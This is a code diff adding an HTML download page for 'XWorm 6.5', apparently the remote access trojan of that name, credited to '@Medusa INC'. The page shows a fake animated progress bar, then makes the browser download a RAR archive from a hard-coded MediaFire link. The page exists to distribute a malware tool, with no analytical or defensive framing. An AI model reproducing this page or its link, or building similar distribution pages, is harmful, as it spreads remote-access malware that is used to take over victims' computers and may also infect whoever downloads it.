@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>XWorm 6.5 Download</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  body {
+    margin: 0;
+    font-family: 'Inter', sans-serif;
+    background: radial-gradient(circle at 30% 30%, #0f1023, #050510);
+    color: #f2f4ff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    overflow: hidden;
+  }
+  .card {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 20px;
+    padding: 40px 60px;
+    text-align: center;
+    box-shadow: 0 0 30px rgba(120,100,255,0.2);
+    position: relative;
+    width: 360px;
+  }
+  h1 {
+    font-size: 2.3rem;
+    color: #a4b8ff;
+    text-shadow: 0 0 10px #4a6bff;
+    margin-bottom: 0.3em;
+  }
+  p.status {
+    font-size: 1rem;
+    margin: 10px 0 20px;
+    color: #9aa4d4;
+  }
+  .download-btn {
+    background: linear-gradient(90deg, #5f5fff, #33d7ff);
+    border: none;
+    padding: 14px 36px;
+    color: white;
+    font-weight: 600;
+    border-radius: 40px;
+    font-size: 1.1rem;
+    cursor: pointer;
+    box-shadow: 0 0 15px rgba(90,120,255,0.6);
+    transition: transform 0.2s, box-shadow 0.2s;
+  }
+  .download-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 25px rgba(90,120,255,0.9);
+  }
+  .progress {
+    width: 100%;
+    background: rgba(255,255,255,0.08);
+    border-radius: 8px;
+    height: 10px;
+    margin-top: 25px;
+    overflow: hidden;
+  }
+  .progress-bar {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #5f5fff, #33d7ff);
+    border-radius: 8px;
+    box-shadow: 0 0 10px #5f5fff;
+    transition: width 0.3s;
+  }
+  .corner {
+    position: absolute;
+    bottom: 10px;
+    right: 15px;
+    font-size: 0.9rem;
+    color: #646cff;
+    opacity: 0.8;
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h1>XWorm 6.5</h1>
+  <p class="status" id="status">Status: <span>Waiting to download…</span></p>
+  <button class="download-btn" id="downloadBtn">Download</button>
+  <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+  <div class="corner">@Medusa INC</div>
+</div>
+
+<script>
+const btn = document.getElementById('downloadBtn');
+const statusEl = document.getElementById('status').querySelector('span');
+const progressBar = document.getElementById('progressBar');
+
+btn.addEventListener('click', () => {
+  btn.disabled = true;
+  statusEl.textContent = 'Downloading';
+  let p = 0;
+
+  // Animated dots for "Downloading..."
+  let dots = 0;
+  const dotsInterval = setInterval(() => {
+    dots = (dots + 1) % 4;
+    statusEl.textContent = 'Downloading' + '.'.repeat(dots);
+  }, 500);
+
+  const timer = setInterval(() => {
+    p += Math.random() * 20; // fast progress
+    if (p >= 100) {
+      p = 100;
+      clearInterval(timer);
+      clearInterval(dotsInterval);
+      statusEl.textContent = 'Download complete!';
+      btn.disabled = false;
+      // trigger actual download
+      const a = document.createElement('a');
+      a.href = "https://download938.mediafire.com/y3oq95i7quagw0zohHc0W4eZVpJpOz0KMN90JNOJSnuFSkt1Mkqf6qZYE6DQo_9u5Syf8bYH1AUKwhm07vlqRG2cTZtsjff71vrSmvKbD8ugQLyj3qUE5OtqPLVEaDgD3l8UU66XXnkERLTnjIr8j2rgbZz_aOwP5HJVLGTtDL7xug/kwqnsv2ubc8r9xf/XWorm+V6.5.rar";
+      a.download = 'XWorm_6.5.rar';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }
+    progressBar.style.width = p + "%";
+  }, 200);
+});
+</script>
+
+</body>
+</html>
